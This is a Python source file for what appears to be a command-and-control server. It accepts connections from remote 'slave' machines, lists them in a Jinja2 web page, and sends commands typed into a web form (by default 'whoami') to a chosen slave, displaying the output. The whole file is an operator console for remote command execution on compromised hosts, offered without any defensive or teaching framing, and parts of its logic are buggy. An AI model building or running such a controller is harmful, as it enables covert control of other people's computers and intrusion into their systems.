import socket
import pdb
import base64
import urllib.parse
from urllib.parse import unquote_plus
from optparse import OptionParser
from threading import Thread
from jinja2 import Template


def parse_cli_args():
    parser = OptionParser()
    parser.add_option('-a', '--socket_addr', dest='socket_addr')
    parser.add_option('-p', '--socket_port', dest='socket_port')
    options, args = parser.parse_args()
    return {
        'socket_host': options.socket_addr,
        'socket_port': options.socket_port
    }

opts = parse_cli_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = opts['socket_host'], int(opts['socket_port'])
sock.bind(server_address)
sock.listen(1)


connections = list()
while True:
    # pdb.set_trace()
    connection, client_addr = sock.accept()
    print(f'New conn from {client_addr}')
    if client_addr[1] not in ('localhost', '127.0.0.1'):
        conn = {
            'conn': connection,
            'ip': client_addr[0],
            'port': client_addr[1],
            'url': base64.b64encode(f'{client_addr[0]}:{client_addr[1]}'.encode('utf-8')).decode('utf-8')
        }

    payload = b'whoami'
    data = connection.recv(1024).decode('utf-8')

    # slave connected
    if data.startswith('Slave'):
        connections.append(conn)
    if data.startswith('GET / '):
        # payload URLs: POST /b64<payload>?b64<host:port>
        # add payload input field
        print(f'Web interface Request data: << {data}')
        with open('index.html') as file_:
            template = Template(file_.read())
        # check connections if actual/exclude web conns
        response = template.render(connections=connections)
        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
        connection.send(response.encode('utf-8'))
        connection.close()
        continue
    elif data.startswith('GET /favicon'):
        connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
        connection.close()
    elif data.startswith('GET /payload_'):
        # encode payload b64
        # payload: POST /b64<host:port>
        # pdb.set_trace()
        # payload from textarea form input
        host, payload = data.split()[1][9:].split('?payload=') #b64decode split(':')
        payload = unquote_plus(payload)
        #host, port = base64.b64decode(host).decode('utf-8').split(':')
        slave_connection = None
        for conn in connections:
            if conn['url'] == host:
                slave_connection = conn
                break
        print(f'sending payload to {host}: >> {payload}')
        slave_connection['conn'].sendall(payload.encode('utf-8'))
        # render payload result
        response_data = slave_connection['conn'].recv(1024).decode('utf-8')
        print(f'Slave {host} reply: << {response_data}')
        response = template.render(response=response_data)
        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
        connection.send(response.encode('utf-8'))
    elif data.startswith('GET'):
        print(f'Request data: << {data}')
    elif not data: break  # else?
    # print(data)
    print(f'{client_addr}: << {data}')
